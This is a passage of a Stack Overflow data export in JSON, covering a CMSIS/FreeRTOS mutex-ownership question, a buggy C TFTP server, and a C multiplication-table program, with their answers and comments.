"https://www.gravatar.com/avatar/934de7ad57af9a8f6a37e0c78017f942?s=128&d=identicon&r=PG", "display_name": "Russ Schultz", "link": "https://stackoverflow.com/users/550235/russ-schultz"}, "edited": false, "score": 0, "creation_date": 1518577717, "post_id": 48775185, "comment_id": 84559690, "body": "FWIW, looking at the FreeRTOS and CMSIS online documentation, it&#39;s unclear that a mutex can only be released by the thread that owns it.  You&#39;d probably have to dig into kernel source and see if it actually checks the owner thread ID nor not.  My personal guess is it doesn&#39;t."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 2030, "user_id": 550235, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/934de7ad57af9a8f6a37e0c78017f942?s=128&d=identicon&r=PG", "display_name": "Russ Schultz", "link": "https://stackoverflow.com/users/550235/russ-schultz"}, "edited": false, "score": 1, "creation_date": 1518603453, "post_id": 48775185, "comment_id": 84570638, "body": "@RussSchultz ; The semantics of a mutex require thread ownership, otherwise it is just a binary semaphore.  The <a href=\"https://www.keil.com/pack/doc/CMSIS/RTOS/html/group__CMSIS__RTOS__MutexMgmt.html#details\" rel=\"nofollow noreferrer\">CMSIS-RTOS documentation</a> is not at all unclear on this."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 2316, "user_id": 469006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3855250cd4b053ce9204c773246196b?s=128&d=identicon&r=PG", "display_name": "D Krueger", "link": "https://stackoverflow.com/users/469006/d-krueger"}, "edited": false, "score": 0, "creation_date": 1518604015, "post_id": 48775185, "comment_id": 84571023, "body": "I&#39;m with @DKrueger ... your debugging method is suspect.  Occam&#39;s Razor suggests that the mutex mechanism relied upon by thousands of projects over a number of years is more likely to be correct that the debug mechanism you have just invented.  Your debug instrumentation and the thing you are instrumenting need to be bound in a critical section to ensure there is no preemption causing the out-or-order output."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1518604386, "post_id": 48775185, "comment_id": 84571259, "body": "You need to perhaps show the code that you are using to demonstrate this behaviour - that way we can see how your debugging method is flawed, because the reality is it unlikely to be  as you have described."}, {"owner": {"reputation": 13, "user_id": 9356941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eeb3b606a963608ff7377376d4463424?s=128&d=identicon&r=PG&f=1", "display_name": "David K.", "link": "https://stackoverflow.com/users/9356941/david-k"}, "edited": false, "score": 0, "creation_date": 1518617434, "post_id": 48775185, "comment_id": 84580092, "body": "Thanks for all the comments everyone. Both of the threads are the same priority, but it&#39;s definitely possible our debug method is flawed. I added the function we&#39;re using for SWO output to the original question. I was just trying to come up with some way to determine what is happening without adding much latency. I agree it&#39;s unlikely that the mutex mechanism is flawed, but we have already found one verified bug with our CMSIS version on this project, so that&#39;s where we started looking. Anyway, we&#39;ll try these suggestions and update if something works."}, {"owner": {"reputation": 2030, "user_id": 550235, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/934de7ad57af9a8f6a37e0c78017f942?s=128&d=identicon&r=PG", "display_name": "Russ Schultz", "link": "https://stackoverflow.com/users/550235/russ-schultz"}, "reply_to_user": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1518625168, "post_id": 48775185, "comment_id": 84585489, "body": "@clifford  I agree those are the classical semantics.  It doesn&#39;t mean the RTOS implements it correctly.  Inspecting the RTX (old version and new) code it appears to check mutex ownership and return an error if not the owner.   FreeRTOS does NOT appear to return error for cases on non-recursive mutexes (at least as far as I cared to look at the code).     Non-recursive mutexes APPEAR to be treated as semaphores, but there&#39;s a lot of <code>#define</code> indirection and abstraction of objects as queues that might be obscuring the check for ownership from me."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 2030, "user_id": 550235, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/934de7ad57af9a8f6a37e0c78017f942?s=128&d=identicon&r=PG", "display_name": "Russ Schultz", "link": "https://stackoverflow.com/users/550235/russ-schultz"}, "edited": false, "score": 0, "creation_date": 1518629344, "post_id": 48775185, "comment_id": 84588154, "body": "@RussSchultz : Regardless of the FreeRTOS semantics, the CMSIS-RTOS required semantics are clear, and the abstraction layer must adapt the underlying RTOS to conform.  FreeRTOS is &quot;unusual&quot; in many ways with respect to its implementation, but the CMSIS-RTOS specification is a facade layer intended to provide common and consistent semantics and API.  Personally I&#39;d avoid both FreeRTOS and CMSIS-RTOS, but that is a different issue."}, {"owner": {"reputation": 2030, "user_id": 550235, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/934de7ad57af9a8f6a37e0c78017f942?s=128&d=identicon&r=PG", "display_name": "Russ Schultz", "link": "https://stackoverflow.com/users/550235/russ-schultz"}, "reply_to_user": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1518630188, "post_id": 48775185, "comment_id": 84588579, "body": "@CLIFFORD  I&#39;ll disagree that the semantics are clear in the CMSIS-RTOS documentation.  While it does say mutexes introduce ownership, and the owner can recursively obtain, it doesn&#39;t state anywhere a non-owner cannot release.  The return values of <code>osMutexRelease()</code> don&#39;t include &#39;non-owner&#39; as a potential error (RTX implementation just returns <code>osError</code>, which actually isn&#39;t listed as a possible return value in the documentation).   We all assume only owners can release a mutex, because it&#39;s a generally accepted semantic of mutexes, but..."}, {"owner": {"reputation": 13, "user_id": 9356941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eeb3b606a963608ff7377376d4463424?s=128&d=identicon&r=PG&f=1", "display_name": "David K.", "link": "https://stackoverflow.com/users/9356941/david-k"}, "edited": false, "score": 0, "creation_date": 1518636890, "post_id": 48775185, "comment_id": 84592028, "body": "I added a new mutex to test if one thread could capture it and another could release it. I checked the values in the debugger and it appears that CMSIS/FreeRTOS does allow this behavior. The call in thread 1 to capture the mutex succeeds, and the call in thread 2 to release the mutex also succeeds, both with osOK. It would seem it is not guarded against. These two locations are the only areas where the mutex is ever changed."}], "answers": [{"tags": [], "owner": {"reputation": 13, "user_id": 9356941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eeb3b606a963608ff7377376d4463424?s=128&d=identicon&r=PG&f=1", "display_name": "David K.", "link": "https://stackoverflow.com/users/9356941/david-k"}, "is_accepted": true, "score": 0, "last_activity_date": 1518724380, "last_edit_date": 1518724380, "creation_date": 1518702183, "answer_id": 48808719, "question_id": 48775185, "link": "https://stackoverflow.com/questions/48775185/mutex-captured-by-one-thread-and-released-by-another-cmsis-and-freertos-stm-boar/48808719#48808719", "title": "Mutex captured by one thread and released by another CMSIS and FreeRTOS STM board", "body": "<p>The configuration of CMSIS and FreeRTOS that we are using does allow one thread to release a mutex that was captured by another thread.</p>\n\n<p>I added a new mutex to test if one thread could capture it and another could release it. I checked the values of each call in the debugger and both return osOK. CMSIS/FreeRTOS does allow this behavior. These two locations are the only areas where the mutex is ever changed.</p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 9356941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eeb3b606a963608ff7377376d4463424?s=128&d=identicon&r=PG&f=1", "display_name": "David K.", "link": "https://stackoverflow.com/users/9356941/david-k"}, "edited": false, "score": 0, "creation_date": 1518786511, "post_id": 48817885, "comment_id": 84658560, "body": "Thanks so much for the reply. It&#39;s interesting that this isn&#39;t spelled out in the documentation, but must be inferred by the lack of a specific error code. Either way I&#39;m glad to see some evidence to back up our results. Thanks again!"}], "tags": [], "owner": {"reputation": 2316, "user_id": 469006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3855250cd4b053ce9204c773246196b?s=128&d=identicon&r=PG", "display_name": "D Krueger", "link": "https://stackoverflow.com/users/469006/d-krueger"}, "is_accepted": false, "score": 0, "last_activity_date": 1518737078, "creation_date": 1518737078, "answer_id": 48817885, "question_id": 48775185, "link": "https://stackoverflow.com/questions/48775185/mutex-captured-by-one-thread-and-released-by-another-cmsis-and-freertos-stm-boar/48817885#48817885", "title": "Mutex captured by one thread and released by another CMSIS and FreeRTOS STM board", "body": "<p>CMSIS doesn't require that the thread that acquires the mutex is the same as the one that releases it. From the <a href=\"http://www.keil.com/pack/doc/cmsis/RTOS/html/index.html\" rel=\"nofollow noreferrer\">CMSIS-RTOS</a> Documentation of <code>osMutexRelease</code>:</p>\n\n<blockquote>\n  <p>osStatus osMutexRelease   (   osMutexId   mutex_id    )</p>\n  \n  <p>Release a Mutex that was obtained with osMutexWait. Other threads that\n  currently wait for the same mutex will be now put into the state\n  READY.</p>\n  \n  <p><strong>Status and Error Codes</strong></p>\n  \n  <ul>\n  <li>osOK: the mutex has been correctly released.   </li>\n  <li>osErrorResource: the mutex was not obtained before.   </li>\n  <li>osErrorParameter: the parameter mutex_id is incorrect.   </li>\n  <li>osErrorISR: osMutexRelease cannot be called from interrupt service routines.</li>\n  </ul>\n</blockquote>\n\n<p>Note that there is no error code for the condition when different threads acquire and release the mutex.</p>\n\n<p>Having the same thread acquire and release a mutex is good design, but it's not enforced by CMSIS.</p>\n"}], "owner": {"reputation": 13, "user_id": 9356941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eeb3b606a963608ff7377376d4463424?s=128&d=identicon&r=PG&f=1", "display_name": "David K.", "link": "https://stackoverflow.com/users/9356941/david-k"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 548, "favorite_count": 0, "accepted_answer_id": 48808719, "answer_count": 2, "score": 1, "last_activity_date": 1518737078, "creation_date": 1518554100, "last_edit_date": 1518617614, "question_id": 48775185, "link": "https://stackoverflow.com/questions/48775185/mutex-captured-by-one-thread-and-released-by-another-cmsis-and-freertos-stm-boar", "title": "Mutex captured by one thread and released by another CMSIS and FreeRTOS STM board", "body": "<p>We are having an issue with a mutex in CMSIS and FreeRTOS on an STM32F407 board.</p>\n\n<p>There are two threads that can access a hardware radio via a UART. We are using a mutex to ensure only one thread can talk to the radio at a time.</p>\n\n<p>Using SWO to print to the serial port every time the mutex is captured or released successfully, we can see that in certain situations the following occurs:</p>\n\n<ul>\n<li><p>Thread 1 captures the mutex successfully using osMutexWait(radioAccessMutex, 400)</p></li>\n<li><p>Thread 2 releases the same mutex successfully using osMutexRelease(radioAccessMutex)</p></li>\n</ul>\n\n<p>From my understanding, a mutex can only be released by the thread currently holding the mutex.</p>\n\n<p>The return values from both mutex calls is osOK. Recursive mutexes have been turned off in the config file. Both threads are the same priority.</p>\n\n<p>Possibly relevant information:\nCMSIS v. 1.02\nFreeRTOS v. 8.2.1</p>\n\n<p>Code for SWO output:</p>\n\n<pre><code>void SWO_write(char* output)\n{\n    for(int i = 0; i &lt; strlen(output); i++)\n    {\n      ITM_SendChar(output[i]);\n    }\n}\n</code></pre>\n\n<p>This code is called every time the mutex is captured or released immediately following the successful call. A null terminated string is passed in with the result of the call.</p>\n"}, {"tags": ["c++", "c", "tftp"], "comments": [{"owner": {"reputation": 2071, "user_id": 7478530, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cGr5i.png?s=128&g=1", "display_name": "Dragonthoughts", "link": "https://stackoverflow.com/users/7478530/dragonthoughts"}, "edited": false, "score": 0, "creation_date": 1518554144, "post_id": 48775159, "comment_id": 84552053, "body": "Please include your code sample, not a link to a picture of it."}, {"owner": {"reputation": 1, "user_id": 7735405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05327708c7af73a40b081d39baf6c3b0?s=128&d=identicon&r=PG&f=1", "display_name": "AllenLiiu574", "link": "https://stackoverflow.com/users/7735405/allenliiu574"}, "reply_to_user": {"reputation": 2071, "user_id": 7478530, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cGr5i.png?s=128&g=1", "display_name": "Dragonthoughts", "link": "https://stackoverflow.com/users/7478530/dragonthoughts"}, "edited": false, "score": 0, "creation_date": 1518554175, "post_id": 48775159, "comment_id": 84552064, "body": "thank you. I just added it"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7735405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05327708c7af73a40b081d39baf6c3b0?s=128&d=identicon&r=PG&f=1", "display_name": "AllenLiiu574", "link": "https://stackoverflow.com/users/7735405/allenliiu574"}, "edited": false, "score": 0, "creation_date": 1518574611, "post_id": 48777079, "comment_id": 84558982, "body": "thanks. here is the code. the buffer + 4 made the chance of getting error code lower, but it still exists. I will update my full code."}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "reply_to_user": {"reputation": 1, "user_id": 7735405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05327708c7af73a40b081d39baf6c3b0?s=128&d=identicon&r=PG&f=1", "display_name": "AllenLiiu574", "link": "https://stackoverflow.com/users/7735405/allenliiu574"}, "edited": false, "score": 0, "creation_date": 1518644748, "post_id": 48777079, "comment_id": 84595958, "body": "@AllenLiiu574 <code>buffer[datalen + 4] = &#39;\\0&#39;;</code> may cause buffer overrun like <code>buffer[datalen + 2] = &#39;\\0&#39;;</code>. Remove it."}], "tags": [], "owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "is_accepted": false, "score": 0, "last_activity_date": 1518562800, "creation_date": 1518562800, "answer_id": 48777079, "question_id": 48775159, "link": "https://stackoverflow.com/questions/48775159/error-code-1024-tftp-server/48777079#48777079", "title": "error code 1024 tftp server", "body": "<p>I read your code but not tested by executing.</p>\n\n<p>Compareing with <a href=\"https://tools.ietf.org/html/rfc1350\" rel=\"nofollow noreferrer\">RFC 1350</a>, what I found are</p>\n\n<ul>\n<li>The data field is upto 512 bytes, so 512-byte <code>buffer</code> is not enough because there are no room for the header (Opcode and Block #). You need at least 4 more bytes.</li>\n<li>You write the data from <code>buffer + 2</code> via <code>memcpy()</code>. This should destroy the block number. It seems <code>buffer + 4</code> should be used instead.</li>\n<li><code>buffer[datalen + 2] = '\\0';</code> shouldn't be needed. I think you should remove it because it will destroy the data or cause buffer overrun.</li>\n<li>You should close the file opened after handling read request.</li>\n</ul>\n"}], "owner": {"reputation": 1, "user_id": 7735405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05327708c7af73a40b081d39baf6c3b0?s=128&d=identicon&r=PG&f=1", "display_name": "AllenLiiu574", "link": "https://stackoverflow.com/users/7735405/allenliiu574"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 309, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518574671, "creation_date": 1518554007, "last_edit_date": 1518574671, "question_id": 48775159, "link": "https://stackoverflow.com/questions/48775159/error-code-1024-tftp-server", "title": "error code 1024 tftp server", "body": "<p>I am writing a tftp server in C and testing it with the tftp command on the terminal. However, for most of the times, I receive something liske the following when I try to send RRQ:</p>\n\n<pre><code>tftp&gt; get a.txt\nsent RRQ &lt;file=a.txt, mode=netascii&gt;\nreceived ERROR &lt;code=4, msg=&gt;\nError code 1024: \n</code></pre>\n\n<p>other barly happend case includes:</p>\n\n<pre><code>tftp&gt; get a.txt\nsent RRQ &lt;file=a.txt, mode=netascii&gt;\nreceived DATA &lt;block=20334, 512 bytes&gt;\ndiscarded 4 packets\n</code></pre>\n\n<p>and this one: this might look correct but it barely happened. The text file I use to test it is of 857 bytes.</p>\n\n<pre><code>sent ACK &lt;block=1&gt;\nreceived DATA &lt;block=1, 512 bytes&gt;\nsent ACK &lt;block=1&gt;\nreceived DATA &lt;block=2, 345 bytes&gt;\nReceived 857 bytes in 0.0 seconds\n</code></pre>\n\n<p>and here is part of my code\nHere buffer is a char array of size 512 , to simplify the code, I have removed some of the error handling code\nThanks to whoever may help</p>\n\n<pre><code>            #include &lt;iostream&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;sys/select.h&gt; \n#include &lt;sys/stat.h&gt;\n#include &lt;dirent.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;string.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;cerrno&gt;\n\n\n//define opcode for later use\nenum opcode {\n     RRQ = 1,\n     WRQ,\n     DATA,\n     ACK,\n     ERROR\n};\n\n\nvoid handle_write(struct sockaddr_in * sock_info, char* filename, int BUF_LEN){\n    //printf(\"Received write request + %d\\n\", WRQ);\n    return;\n}\n\nvoid handle_error(unsigned short int * opcode_ptr, char* buffer, socklen_t sockaddr_len, int server_socket, struct sockaddr_in * sock_info, const char* errormsg){\n     ssize_t n;\n     *opcode_ptr = htons(ERROR);\n     *(opcode_ptr + 1) = htons(1);\n     *(buffer + 4) = 0;\n     //memcpy(buffer+4, errormsg, strlen(errormsg));\n intr_send:\n     n = sendto(server_socket, buffer, 5, 0,\n                (struct sockaddr *)sock_info, sockaddr_len);\n     if(n &lt; 0) {\n         if(errno == EINTR) goto intr_send;\n         perror(errormsg);\n         exit(-1);\n     }\n    return;\n}\n\nint main() {\n    int BUF_LEN = 516;\n    ssize_t n;\n    char buffer[BUF_LEN];\n    socklen_t sockaddr_len;\n    int server_socket;\n    struct sigaction act;\n    unsigned short int opcode;\n    unsigned short int * opcode_ptr;\n    struct sockaddr_in sock_info;\n    memset(&amp;sock_info, 0, sockaddr_len);\n\n    //----------setup the server----------------//\n    sock_info.sin_addr.s_addr = htonl(INADDR_ANY);\n    sock_info.sin_port = htons(5743);\n    sock_info.sin_family = PF_INET;\n\n    if((server_socket = socket(PF_INET, SOCK_DGRAM, 0)) &lt; 0) {\n        perror(\"socket\");\n        exit(-1);\n    }\n\n    sockaddr_len = sizeof(sock_info);\n    if(bind(server_socket, (struct sockaddr *)&amp;sock_info, sockaddr_len) &lt; 0) {\n        perror(\"bind\");\n        exit(-1);\n    }\n\n    getsockname(server_socket, (struct sockaddr *)&amp;sock_info, &amp;sockaddr_len);\n    printf(\"UDP server listening on port: %d\\n\", ntohs(sock_info.sin_port));\n    //----------setup the server----------------//\n\n    while(1){\n    intr_recv:\n         n = recvfrom(server_socket, buffer, BUF_LEN, 0, (struct sockaddr *)&amp;sock_info, &amp;sockaddr_len);\n\n         if(n &lt; 0) {\n            if(errno == EINTR) goto intr_recv;\n            perror(\"recvfrom()\");\n            exit(-1);\n        }\n        opcode_ptr = (unsigned short int *)buffer;\n        opcode = ntohs(*opcode_ptr);    //the opcode will be either RRQ or WRQ according to the test\n        if(opcode != RRQ &amp;&amp; opcode != WRQ) {\n            /* Illegal TFTP Operation */\n            handle_error(opcode_ptr, buffer, sockaddr_len, server_socket, &amp;sock_info, \"invalid command\");\n        }\n        else {\n            if(fork() == 0) {\n                /* Child - handle the request */\n                FILE* fd;\n                char* filename;\n                filename = strdup(buffer+2);  //this is the filename to be read (i.e. a.txt)\n\n                printf(\"request received\\n\");\n                char data[512];\n                //----------------------------------handle read request-------------------------------------//\n                if(opcode == RRQ){\n                    int blocknumber = 0;\n                    int i = 0; //counter for loop\n                    fd = fopen(filename, \"r\");\n                    free(filename);\n                    //uint8_t data[512];\n                    ssize_t datalen, n;\n                    int done = 0;   //this is a boolean indicator that indicates whether the packet transfering process is done or not.\n                    while(!done){\n                        datalen = fread(data, 1, 512, fd);\n                        blocknumber++;\n                        if(datalen &lt; 512){\n                            done = 1;       //according to rfc 1350, the last packet will have a data length less than 512 bytes.\n                        }\n                        //for(i = 5; i &gt; 0; i--){\n                        *opcode_ptr = htons(DATA);\n                        opcode = ntohs(*opcode_ptr);\n                        *(opcode_ptr + 1) = htons(blocknumber);\n                        memcpy(buffer + 4, data, datalen);\n                        buffer[datalen + 4] = '\\0';\n                        //*(buffer + 4) = 0;\n                        //printf(\"%d  %s\\n\", datalen, buffer+2);\n                        n = sendto(server_socket, buffer, 4 + datalen, 0, (struct sockaddr *)&amp;sock_info, sockaddr_len);\n                        if(n &lt; 0){\n                            perror(\"sendto() failed\");\n                            exit(-1);\n                        }\n                        //printf(\"done %d\\n\", done);\n                        //char buffer[512];\n                        n = recvfrom(server_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&amp;sock_info, &amp;sockaddr_len);\n                        opcode_ptr = (unsigned short int *)buffer;\n                        opcode = ntohs(*opcode_ptr);\n                        if(n &gt;= 0 &amp;&amp; n &lt; 4){\n                            //handle_error(opcode_ptr, buffer, sockaddr_len, server_socket, &amp;sock_info, \"invalid request size\");\n                        }\n                         if(n &gt; 4){\n                             break;\n                         }\n                         //}\n                        //if(i != 0){\n                        //    printf(\"Transfer timeout!\\n\");\n                        //    exit(1);\n                        //}\n                        //printf(\"opcode is %d\\n\", opcode);\n                        if(opcode == ERROR){\n                            printf(\"Error received\\n\");\n                            exit(1);\n                        }\n\n                        if(opcode != ACK){\n                            printf(\"Invalid message received\\n\");\n                            exit(1);\n                        }\n                    }\n                }\n                //----------------------------------handle read request-------------------------------------//\n\n\n\n                //----------------------------------handle write request------------------------------------//\n\n                //----------------------------------handle write request------------------------------------//\n\n                close(server_socket);\n                break;\n            }\n            else {\n                /* Parent - continue to wait */\n            }\n        }\n    }\n\n\n\n\n\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "nested", "tabular"], "comments": [{"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1518561818, "post_id": 48775151, "comment_id": 84555489, "body": "<code>printf(&quot;%3i &quot;), i+2;</code> is wrong because data to format via <code>printf()</code> is missing, but there should be other problems."}], "answers": [{"tags": [], "owner": {"reputation": 366, "user_id": 8366717, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yY4lP.png?s=128&g=1", "display_name": "Jango", "link": "https://stackoverflow.com/users/8366717/jango"}, "is_accepted": false, "score": 0, "last_activity_date": 1547212670, "last_edit_date": 1547212670, "creation_date": 1518565013, "answer_id": 48777428, "question_id": 48775151, "link": "https://stackoverflow.com/questions/48775151/trying-to-get-a-user-input-to-make-a-2-d-array-multiplication-table/48777428#48777428", "title": "Trying to get a user input to make a 2-D array multiplication table", "body": "<p>Check the solution below. It's all about properly managing iterators (note the less-equal sign in the ranges and the subtraction of indexes by 1 in the assignment). You can do it very concisely by assigning to output inside the printf and using a ternary-if. (I also used dynamic allocation in order to comply with ISO standards.)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int range, i, j;\n\n    printf(\"Enter the size of the multiplication table:\\n\");\n    scanf(\"%d\", &amp;range);\n\n    int ** output = (int **) malloc(sizeof(int *) * (long unsigned int) range);\n\n    for(i = 0; i &lt;= range; ++i)\n    {\n        output[i] = (int *) malloc(sizeof(int) * (long unsigned int) range);\n\n        for(j = 0; j &lt;= range; ++j)\n            printf(\"%3d \", !i ? j : !j ? i : (output[i - 1][j - 1] = i * j));\n\n        printf(\"\\n\");\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 2, "last_activity_date": 1518571435, "last_edit_date": 1518571435, "creation_date": 1518571092, "answer_id": 48778260, "question_id": 48775151, "link": "https://stackoverflow.com/questions/48775151/trying-to-get-a-user-input-to-make-a-2-d-array-multiplication-table/48778260#48778260", "title": "Trying to get a user input to make a 2-D array multiplication table", "body": "<p>You have two primary problems, (1) you fail to validate your user input, and (2) your loop bounds are incorrect, e.g.</p>\n\n<p>Any time you take user input, you must <strong>validate</strong> that you actually received what you expected and that any conversion required, was completed successfully. Failure to validate will lead to <em>Undefined Behavior</em> it invalid (or no) input is provide. (e.g. What if the user enters <code>foo</code> instead of <code>10</code>?) When using <code>scanf</code>, you must validate the <strong>return</strong> which provides the count of the number of conversions that successfully took place, e.g.</p>\n\n<pre><code>    printf (\"Input size of multiplication table: \");\n    if (scanf(\"%i\", &amp;range) != 1) { /* VALIDATE ALL USER INPUT */\n        fprintf (stderr, \"error: invalid input.\\n\");\n        return 1;\n    }\n</code></pre>\n\n<p>That is bare minimum. You can also check if the return is <code>EOF</code> to indicate the user canceled input with a <kbd>[Ctrl+D]</kbd> (or <kbd>[Ctrl+Z]</kbd> on windoze -- must be explicitly enabled on Win10).</p>\n\n<p>Next, your loop bound are <code>for (i = 0; i &lt; range; i++)</code> <strong>not</strong> <code>i &lt;= range</code>, that invokes <em>Undefined Behavior</em> by attempting to access memory outside your array bounds. Simply fix the loop condition, e.g.</p>\n\n<pre><code>    for (i = 0; i&lt; range; i++) {    /* fill multiplication table */\n        for (j = 0; j&lt; range; j++) {\n            output[i][j] = (i + 1) * (j + 1);   /* i+1 * j+1 */\n        }\n    }\n</code></pre>\n\n<p>Putting it altogether, you could do something similar to:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (void) {\n\n    int range, i, j;\n\n    printf (\"Input size of multiplication table: \");\n    if (scanf(\"%i\", &amp;range) != 1) { /* VALIDATE ALL USER INPUT */\n        fprintf (stderr, \"error: invalid input.\\n\");\n        return 1;\n    }\n\n    int output[range][range];       /* variable length array */\n\n    for (i = 0; i&lt; range; i++) {    /* fill multiplication table */\n        for (j = 0; j&lt; range; j++) {\n            output[i][j] = (i + 1) * (j + 1);   /* i+1 * j+1 */\n        }\n    }\n\n    for (i = 0; i&lt; range; i++) {    /* output table */\n        for (j = 0; j&lt; range; j++)\n            printf (\" %3d\", output[i][j]);\n        putchar ('\\n');\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>note:</strong> the trivial parts of the table is omitted (e.g. <code>0 * anything</code>), and duplicated rows of <code>1 * anything</code> are also not shown. If you need to additional rows, you can add them back. </p>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/multable\nInput size of multiplication table: 10\n   1   2   3   4   5   6   7   8   9  10\n   2   4   6   8  10  12  14  16  18  20\n   3   6   9  12  15  18  21  24  27  30\n   4   8  12  16  20  24  28  32  36  40\n   5  10  15  20  25  30  35  40  45  50\n   6  12  18  24  30  36  42  48  54  60\n   7  14  21  28  35  42  49  56  63  70\n   8  16  24  32  40  48  56  64  72  80\n   9  18  27  36  45  54  63  72  81  90\n  10  20  30  40  50  60  70  80  90 100\n</code></pre>\n\n<p>Look things over and let me know if you have further questions.</p>\n\n<hr>\n\n<p><strong>To Show the 1X Rows</strong></p>\n\n<p>You simply update your print routine as follows:</p>\n\n<pre><code>    for (i = 0; i&lt; range; i++) {    /* output table */\n        if (!i) {\n            printf (\"    \");\n            for (j = 0; j&lt; range; j++)\n                printf (\" %3d\", output[i][j]);\n            putchar ('\\n');\n        }\n        printf (\" %3d\", i + 1);\n        for (j = 0; j&lt; range; j++)\n            printf (\" %3d\", output[i][j]);\n        putchar ('\\n');\n    }\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/multable1\nInput size of multiplication table: 10\n       1   2   3   4   5   6   7   8   9  10\n   1   1   2   3   4   5   6   7   8   9  10\n   2   2   4   6   8  10  12  14  16  18  20\n   3   3   6   9  12  15  18  21  24  27  30\n   4   4   8  12  16  20  24  28  32  36  40\n   5   5  10  15  20  25  30  35  40  45  50\n   6   6  12  18  24  30  36  42  48  54  60\n   7   7  14  21  28  35  42  49  56  63  70\n   8   8  16  24  32  40  48  56  64  72  80\n   9   9  18  27  36  45  54  63  72  81  90\n  10  10  20  30  40  50  60  70  80  90 100\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 9356949, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b05c89239a0ef5d6ee0a90222f2fd754?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler B.", "link": "https://stackoverflow.com/users/9356949/tyler-b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 509, 